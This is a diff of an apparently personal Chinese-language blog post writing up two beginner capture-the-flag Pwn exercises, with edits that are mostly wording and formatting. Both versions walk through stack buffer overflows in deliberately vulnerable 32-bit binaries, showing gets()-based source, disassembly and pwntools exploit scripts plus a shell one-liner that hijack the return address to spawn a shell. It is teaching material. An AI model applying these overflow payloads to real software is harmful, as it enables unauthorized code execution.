@@ -106,19 +106,19 @@
 
 
 
-  <meta name="description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下PWN否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
+  <meta name="description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
 <meta property="og:type" content="article">
 <meta property="og:title" content="資安社課 Pwn basic(1)">
 <meta property="og:url" content="https://yctseng1227.github.io/2020/03/22/20200320-nsysuisc-pwn-1/index.html">
 <meta property="og:site_name" content="yctseng&#39;s Blog">
-<meta property="og:description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下PWN否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
+<meta property="og:description" content="經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文… 先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考 另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn否則每次被問到我也不曉得怎麼解釋（抹臉 不會解釋資安… 應該是我的問題才對Orz">
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png">
 <meta property="og:image" content="https://photos.smugmug.com/photos/i-jQZg5kx/0/f2aef2a7/S/i-jQZg5kx-S.png">
-<meta property="og:image" content="https://photos.smugmug.com/photos/i-wwbwWWr/0/2be62d79/S/i-wwbwWWr-S.png">
+<meta property="og:image" content="https://photos.smugmug.com/photos/i-vmX8nT2/0/b97de34e/S/i-vmX8nT2-S.png">
 <meta property="og:image" content="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png">
 <meta property="article:published_time" content="2020-03-22T02:45:23.000Z">
-<meta property="article:modified_time" content="2020-03-31T12:11:26.798Z">
+<meta property="article:modified_time" content="2020-03-31T12:27:52.262Z">
 <meta property="article:author" content="yctseng">
 <meta property="article:tag" content="yctseng">
 <meta name="twitter:card" content="summary">
@@ -452,10 +452,10 @@
       
         <p>經歷大約一學期的CTF洗禮，總算是對這分面稍微有些概念:D<br>原本已經這個部落格的定位應該要是技術向，殊不知都被我拿來發廢文…</p>
 <p>先說這篇的定位，總之作為第一篇writeup，決定拿社課的習題練練手<br>一方面是讓我自己在這方面的學習上可以邊寫邊延伸思考</p>
-<p>另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下PWN<br>否則每次被問到我也不曉得怎麼解釋（抹臉</p>
+<p>另外就是可以給些資訊科系但非資安背景的朋友簡單認識一下Pwn<br>否則每次被問到我也不曉得怎麼解釋（抹臉</p>
 <p>不會解釋資安… 應該是我的問題才對Orz</p>
 <a id="more"></a>
-<p>“<strong>Pwn</strong>“，有人唸Costco、有人唸IKEA，總之我都唸 “胖” 或是 “碰” 。<br>常見做法就是針對程式內的漏洞進行攻擊(提權)，有種”<strong>player has been owned.</strong>“的意思！<br>也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺w<br>在CTF領域，PWN基礎題通常是給你無權讀取的文字檔(flag)，希望你透過程式漏洞拿到root權限拿flag。</p>
+<p>“<strong>Pwn</strong>“，有人唸Costco、有人唸IKEA，總之我都唸 “胖” 或是 “碰” 。<br>常見做法就是針對程式內的漏洞進行攻擊(提權)，有種”<strong>player has been owned.</strong>“的意思！<br>也有人說是Penetration(滲透) + Own(佔有)的組合，總之就大概是這種感覺w<br>在CTF領域，Pwn基礎題通常是給你無權讀取的文字檔(flag)，希望你透過程式漏洞拿到root權限拿flag。</p>
 <p>平常剛拿到題目比較會用到的幾個指令(以我來說)</p>
 <ul>
 <li><code>ls -al</code> 瞭解目錄下的檔案以及執行權限</li>
@@ -469,25 +469,25 @@
 </blockquote>
 <p>第一個檔案<code>password</code>用<code>file</code>指令可以查看關於password的檔案類型。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./password</span></span><br><span class="line">password: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=78715d2680bfeafa1b0a97978bfe8816be4d8423, not stripped</span><br></pre></td></tr></table></figure>
-<p>可以發現是屬於Linux OS底下的ELF執行檔，也是CTF內最常見的檔案類型，不過用MacOS的Safari載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（明明用<code>file</code>看是沒問題啊）</p>
-<p>另外社課提供的PWN基礎題以32-bits為主，據說是比較好拿來練習(?)</p>
+<p>可以發現是屬於Linux OS底下的ELF執行檔，也是CTF內最常見的檔案類型，不過用MacOS的Safari載下來都會莫名被加上<code>.dms</code>，當時第一次看到還在思考檔案是不是壞了XD（用<code>file</code>查看是沒有問題），另外社課提供的Pwn基礎題以<code>32-bits</code>為主，據說是比較好拿來練習(?)</p>
 <p>再來就是直接執行看看… 咦？不能執行？</p>
-<p>用<code>ls</code>發現這個檔案並沒有執行權限，可以用<code>chmod</code>改變他的權限，對其他細節有興趣的可以去Google <strong>鳥哥私房菜</strong> 瞭解一下<code>Linux的檔案權限與目錄配置</code>。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">-rw-r-xr-x@ [other information] password</span><br><span class="line">$ chmod +x .&#x2F;password</span><br><span class="line">$ ls -al</span><br><span class="line">-rwxr-xr-x@ [other information] password</span><br></pre></td></tr></table></figure></p>
-<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。<br>在PWN基礎題通常會刻意把一些<strong>防範機制</strong>關掉，可以拿<code>checksec</code>指令看看該執行檔開了哪些保護，以password這題來說。</p>
+<p>用<code>ls</code>發現這個檔案並沒有執行權限，可以用<code>chmod</code>改檔案權限<br>對其他細節有興趣的可以去Google <strong>鳥哥私房菜</strong> 瞭解一下<code>Linux的檔案權限與目錄配置</code>。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -al</span><br><span class="line">-rw-r-xr-x@ [other information] password</span><br><span class="line">$ chmod +x .&#x2F;password</span><br><span class="line">$ ls -al</span><br><span class="line">-rwxr-xr-x@ [other information] password</span><br></pre></td></tr></table></figure>
+<p>修改完執行權限後可以先run一下看看程式大概要幹嘛。<br>在Pwn基礎題通常會刻意把一些<strong>防範機制</strong>關掉，可以拿<code>checksec</code>指令看看該執行檔開了哪些保護，以password這題來說。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec ./password</span></span><br></pre></td></tr></table></figure>
 <div class="note info">
             <pre>Arch:     i386-32-little<br>RELRO:    <font color='EAC100'>Partial RELRO</font><br>Stack:    <font color='FF0000'>No canary found</font><br>NX:       <font color='009100'>NX enabled</font><br>PIE:      <font color='FF0000'>No PIE (0x8048000)</font><br></pre>
           </div>
 <p>第一次見到這些保護機制不懂也很正常：）<br>白話來說就是</p>
 <ol>
-<li><code>RELRO</code>這篇不會用到，主要適用於<strong>防範lazy Binding</strong>所造成的延伸問題</li>
-<li><code>canary</code>關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是Buffer Overflow</li>
+<li><code>RELRO</code>暫時還不會用到，主要適用於<strong>防範lazy Binding</strong>所造成的延伸問題</li>
+<li><code>canary</code>關閉能夠讓你的輸入超過指定長度蓋到一些奇怪的位址，簡單講就是能Buffer Overflow</li>
 <li><code>NX</code>開啟表示不讓你塞些邪惡的command在程式內執行，之後也會有這部分的練習</li>
-<li><code>PIE</code>關閉讓你分析執行檔時看到的會是”絕對位址”，若開啟就只看得到位址偏移量不容易拿來利用<br>（另外還有一個沒出現在checksec的<code>ASLR</code>，主要是對於每次執行stack、heap…的位址隨機化）</li>
+<li><code>PIE</code>關閉讓你分析執行檔時看到的會是”絕對位址”，若開啟就只看得到位址偏移量不容易拿來利用<br>（另外還有一個沒出現在<code>checksec</code>的<code>ASLR</code>，主要是對於每次執行stack、heap…的位址隨機化）</li>
 </ol>
 <p>之後根據社課這部分內容應該會再講詳細點，剛開始大概有個認知就行了。<br>然後，社課的基礎題還順便附了該執行程式的原始碼，佛心講師╭(⊙Д⊙)╯佛心講師╭(⊙Д⊙)╯</p>
 <figure class="highlight c"><figcaption><span>password.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">12</span>] = <span class="string">"12345678"</span>;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"What's your name? "</span>);</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">"password"</span>)) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Welcome :) "</span>);</span><br><span class="line">        shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"QQ %s\n"</span>, password);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>這段code對於有寫過程式的難民們(?)應該都不困難<br>題意要求輸入<code>name</code>，然後會拿變數<code>password</code>和”password”進行比較，判斷式成立就能執行<code>shell()</code><br>可以發現code中並沒有任何要求輸入<code>password</code>，只有在最後會輸出”QQ <code>password</code>“<br>若第一次接觸PWN的看到這奇怪的判斷式應該會滿頭問號（笑）</p>
+<p>這段code對於有寫過程式的難民們(?)應該都不困難<br>題意要求輸入<code>name</code>，然後會拿變數<code>password</code>和”password”進行比較，判斷式成立就能執行<code>shell()</code><br>可以發現code中並沒有任何要求輸入變數<code>password</code>，只有在最後會輸出”QQ <code>password</code>“<br>若第一次接觸Pwn的看到這奇怪的判斷式應該會滿頭問號（笑）</p>
 <p>不過，我們可以先隨便輸入一些東西觀察看看<br>像是變數<code>name</code>大小為 8 bytes，輸入8字元”12345678”，會得到下面結果。</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">What&#39;s your name? 12345678</span><br><span class="line">Hello 12345678</span><br><span class="line">QQ </span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
 <p>然而，如果輸入超過8個字元”1234567890”，會得到下列結果。</p>
@@ -498,14 +498,14 @@
 <p><code>gets()</code>這輸入函式是不安全的，因為它不會限制使用者的輸入長度<br>因此若在<strong>沒有canary的情況下</strong>很容易遭受<strong>Buffer Overflow</strong>攻擊</p>
 </blockquote>
 <p>以這題來說我們可以用反組譯指令<code>objdump</code>瞭解一下程式架構<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./password</span></span><br></pre></td></tr></table></figure></p>
-<p>stack內容的部分畫成圖大概長得像這樣<br><img src="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png" alt=""></p>
+<p>Stack內容的部分畫成圖大概長得像這樣<br><img src="https://photos.smugmug.com/photos/i-TcQ7Mhh/0/6d3aacdf/S/i-TcQ7Mhh-S.png" alt=""></p>
 <p>我們這次輸入改成”12345678haha”，”haha”就會蓋到變數<code>password</code>的值囉~<br><img src="https://photos.smugmug.com/photos/i-jQZg5kx/0/f2aef2a7/S/i-jQZg5kx-S.png" alt=""></p>
 <p>聰明的你應該知道怎麼做了吧 (｡･ω･｡)<br>沒有錯的啦！將上面的”haha”改成”password”就能啟動<code>shell()</code>拿到root權限了！</p>
-<p>話說回來<br>往後能夠透過手動輸入就破解的PWN題並不常見<br>因此這類型的題目通常會搭配python套件<code>pwntool</code>進行exploit</p>
-<p>↓↓↓以這題來說用pwntool可以這樣寫↓↓↓</p>
+<p>話說回來<br>往後能夠透過手動輸入就破解的Pwn題並不常見<br>因此這類型的題目通常會搭配python套件<code>pwntool</code>進行exploit</p>
+<p>↓↓↓ 以這題來說用pwntool可以這樣寫 ↓↓↓</p>
 <figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># process:本機連線, remote:遠端連線</span></span><br><span class="line">conn = process(<span class="string">'./password'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根據程式內容設計輸入(payload)</span></span><br><span class="line">payload = <span class="string">'12345678password'</span></span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 傳送給程式後, 由於會執行shell需要用interactive()進行互動</span></span><br><span class="line">conn.sendline(payload) </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-<p>光是第一題就打了落落長XD<br>打PWN一開始抓不到感覺還蠻正常der<br>所以我用step by step的方式希望能詳細一點<br>順便幫自己補充平常不太會深入的知識ovo+</p>
-<p>再來就繼續啦！</p>
+<p>光是第一題就打了落落長XD<br>打Pwn一開始抓不到感覺還蠻正常der<br>所以我用step by step的方式希望能詳細一點<br>順便幫自己補充平常不太會深入的知識ovo+</p>
+<p>再來就繼續囉！</p>
 <p><br></p>
 <h2 id="0x02-bof"><a href="#0x02-bof" class="headerlink" title="0x02: bof"></a>0x02: bof</h2><p>這題給的檔案有</p>
 <blockquote>
@@ -526,13 +526,14 @@
 <p>先拿<code>objdump</code>一樣來看看裡頭長什麼樣子</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> objdump -d -M intel ./bof</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">080484eb &lt;shell&gt;:</span><br><span class="line"> 80484eb:	55                   	push   ebp</span><br><span class="line"> 80484ec:	89 e5                	mov    ebp,esp</span><br><span class="line"> 80484ee:	68 e0 85 04 08       	push   0x80485e0</span><br><span class="line"> 80484f3:	e8 b8 fe ff ff       	call   80483b0 &lt;system@plt&gt;</span><br><span class="line"> 80484f8:	83 c4 04             	add    esp,0x4</span><br><span class="line"> 80484fb:	90                   	nop</span><br><span class="line"> 80484fc:	c9                   	leave</span><br><span class="line"> 80484fd:	c3                   	ret</span><br><span class="line"></span><br><span class="line">080484fe &lt;vuln&gt;:</span><br><span class="line"> 80484fe:	55                   	push   ebp</span><br><span class="line"> 80484ff:	89 e5                	mov    ebp,esp</span><br><span class="line"> 8048501:	83 ec 30             	sub    esp,0x30</span><br><span class="line"> 8048504:	68 e8 85 04 08       	push   0x80485e8</span><br><span class="line"> 8048509:	e8 82 fe ff ff       	call   8048390 &lt;printf@plt&gt;</span><br><span class="line"> 804850e:	83 c4 04             	add    esp,0x4</span><br><span class="line"> 8048511:	8d 45 d0             	lea    eax,[ebp-0x30]</span><br><span class="line"> 8048514:	50                   	push   eax</span><br><span class="line"> 8048515:	e8 86 fe ff ff       	call   80483a0 &lt;gets@plt&gt;</span><br><span class="line"> 804851a:	83 c4 04             	add    esp,0x4</span><br><span class="line"> 804851d:	90                   	nop</span><br><span class="line"> 804851e:	c9                   	leave</span><br><span class="line"> 804851f:	c3                   	ret</span><br></pre></td></tr></table></figure>
-<p>重點在line 18的<code>ebp-0x30</code>，必須要掌握變數所在的相對位置<br>把Stack frame畫成圖大概就是下面這樣:)<br><img src="https://photos.smugmug.com/photos/i-wwbwWWr/0/2be62d79/S/i-wwbwWWr-S.png" alt=""></p>
+<p>重點在line 18的<code>ebp-0x30</code>，必須要掌握變數所在的相對位置<br>把Stack frame畫成圖大概就是下面這樣：）<br><img src="https://photos.smugmug.com/photos/i-vmX8nT2/0/b97de34e/S/i-vmX8nT2-S.png" alt=""></p>
 <p>也就是說，這題希望我們除了把<code>str[48]</code>填滿<br>還要利用Buffer Overflow的方式把<code>shell()</code>的address蓋到return上。</p>
-<p>再來就是要知道line 1 <code>shell()</code>的function address<br>假如我們通通用”a”進行覆蓋，預期結果將會長這樣:)<br><img src="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png" alt=""></p>
+<p>再來就是要知道line 1 <code>shell()</code>的function address<br>假如我們通通用”a”進行覆蓋，預期結果將會長這樣：）<br><img src="https://photos.smugmug.com/photos/i-nWpmnNR/0/654a0485/S/i-nWpmnNR-S.png" alt=""></p>
 <p>既然知道要怎麼蓋return address，剩下的就是寫payload了。</p>
 <figure class="highlight python"><figcaption><span>exploit.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = process(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload分成三個部分: 填滿str[48], 覆蓋old ebp, 拿shell()覆蓋return address</span></span><br><span class="line"><span class="comment"># 要注意由於32位元是little-endian, 所以要用p32()轉成\xeb\x84\x04\x08的格式</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">48</span> + <span class="string">'aaaa'</span> + p32(<span class="number">0x080484eb</span>)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-<p>當然如果懶得開檔案寫code，也是有一行流寫法XD<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (python -c <span class="string">"print('a'*48 + 'a'*4 + '\xeb\x84\x04\x08')"</span>; cat) | ./bof</span></span><br></pre></td></tr></table></figure><br><br><br>PWN大概就是這麼一回事了 www<br>寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了(｡･ω･｡)</p>
-<p>就醬。</p>
+<p>這樣就能拿到root權限讀flag，當然如果懶得開檔案寫code，也是有一行流寫法XD<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (python -c <span class="string">"print('a'*48 + 'a'*4 + '\xeb\x84\x04\x08')"</span>; cat) | ./bof</span></span><br></pre></td></tr></table></figure></p>
+<p><br><br>Pwn大概就是這麼一回事了~<br>寫的比預期還要久，而且原本想一篇講個三題，結果第一題介紹太久了(｡･ω･｡)</p>
+<p>就醬，希望我還能繼續把題目補完（逃</p>
 
       
     </div>
